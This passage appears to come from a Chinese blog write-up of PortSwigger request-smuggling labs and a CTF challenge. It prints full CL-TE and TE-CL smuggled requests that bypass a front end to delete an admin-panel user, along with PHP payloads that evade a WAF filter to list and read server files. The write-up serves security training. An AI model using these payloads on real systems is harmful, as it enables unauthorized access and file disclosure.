所谓TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding这一请求头，而后端服务器处理Content-Length请求头。
## **实验实战**
在这个网络环境中，前端服务器负责实现安全控制，只有被允许的请求才能转发给后端服务器，而后端服务器无条件的相信前端服务器转发过来的全部请求，对每个请求都进行响应
#### CL-TE绕过前端服务器安全控制
[实验环境](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)
实验目的是让我们获取admin权限并删除用户carlos  
直接访问`/admin`，会返回提示`Path /admin is blocked`,应该是前端服务器限制了，提示了这关实验属于  
**CL-TE** ，那就用这种方法来做
    POST / HTTP/1.1
    Host: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.net
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    DNT: 1
    Cookie: session=5n2xRNXtAYM9teOEn3jSkEDDabLe0Qv8
    X-Forwarded-For: 8.8.8.8
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 38
    Transfer-Encoding: chunked
    0
    GET /admin HTTP/1.1
    foo: bar
上面已经了解后端服务器无条件的相信前端服务器转发过来的全部请求，所以`Content-Length:
38`先绕过前端服务器，而后端服务器检测出`Transfer-Encoding: chunked`并执行，到下面的0便结束，但后面还有`GET /admin
HTTP/1.1`，后端服务器会认为这是下一个请求，所以如果我们继续请求，后端服务器便会解析这个请求，从而达到我们查看admin目录的目的
但这里我尝试很多次也没有出现admin目录，但是大师傅确实是这样做就能绕过的，这点就先不深究了，就先了解攻击的具体方法
（参考大师傅的图片）师傅博客[HTTP协议攻击之走私请求](https://paper.seebug.org/1048/#51)  
出现这段话，提示以管理员身份访问或者在本地登录才可以访问`/admin`，那就添加一个`Host: localhost`请求头  
那接下来就来删除用户，只需对`/admin/delete?username=carlos`进行请求即可  
**PS** :这里不成功就多请求几次，但我请求好多次都没有成功，但是攻击原理没有错，只能搬下师傅图片，大佬勿喷。
#### **使用TE-CL绕过前端服务器安全控制**
[实验环境](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)
我们已经知道当收到存在两个请求头的请求包时，前端代理服务器处理`Transfer-Encoding`这一请求头，而后端服务器处理`Content-Length`请求头。  
    POST / HTTP/1.1
    Host: ac491fe91ef65e09807a0dad006b002f.web-security-academy.net
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    DNT: 1
    Cookie: session=eqdBic2TizWiC3INHEQsWxwcMrrW6DAq
    Content-Length: 96
    Transfer-Encoding: chunked
    aa
    GET /admin//delete?username=carlos HTTP//1.1
    Host: localhost
    0
这里前端服务器先处理`Transfer-Encoding:
chunked`，一直到`0`，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器对`Content-Lengrh`进行处理，当读取到`aa`时，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，我们再次请求会便会执行这个请求`GET
/admin//delete?username=carlos HTTP//1.1`，其他的操作就和`CL-TE`一样
其他方法攻击也只需要理解其原理，便可以使用，接下来就通过这次的题来实践一下
## **题目实践**
这次线下赛的题是改编自国赛love_math，与之前的稍微有些不同，没有了长度限制，添加了前端waf  
很明显是命令执行，但不能包含空格、制表符、换行、单双引号、反引号、`[]`、`$`，由于单双引号被禁用，我们无法从函数名中提取字符串，所以只能通过从函数的返回结果中获取。
翻阅文档查道`base_convert`函数  
简单测试下，发现确实可以执行，`base_convert("phpinfo",36,10);`将36进制转换为10进制,然后将10进制转换为36进制那么就可以构造出来`phpinfo()`  
这是师傅们的payload：
    base_convert(2146934604002,10,36(hex2bin(dechex(47)).base_convert(25254448,10,36))
涉及到三个函数，dechex()将10进制转16进制，而hex2bin是将16进制转char，`scandir()`
函数返回一个数组，其中包含指定路径中的文件和目录，这里其实有一个疑问，为什么要先转成16再从16转字符来构造构造`‘/’`，那干脆从一开始直接用`chr`函数不就行了
所以这里可以使用php函数`readfile`等函数读取文件
具体payload：
    var_dump(scandir(chr(47)));
查看根目录下的文件，这里就涉及到我们上面所学的HTTP请求走私，因为前端设置了waf，有些字符不能包含，否则会报403，就利用请求走私的方法来进行绕过
可以利用CL-CL进行绕过
中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理，也就是说如果我们同时拥有两个`Content-Length`，前端和后端都各自执行一次，所以我们构造如下  
最终payload：
    var_dump(readfile(chr(47).base_convert(25254448,10,36)));
除此之外，这道题还有另外一种方法可以解决：
我们在输入时发现`num`只能输入数字，输入字符无法解析
这里可以利用php的字符串解析特性绕过bypass，接下来利用`chr()`函数绕过特殊字符的限制来进行代码执行读flag即可
payload：
    http://node3.buuoj.cn:28428/calc.php?%20num=1;var_dump(scandir(chr(47)))
    calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
具体可以参考  
[利用PHP的字符串解析特性Bypass](https://www.freebuf.com/articles/web/213359.html)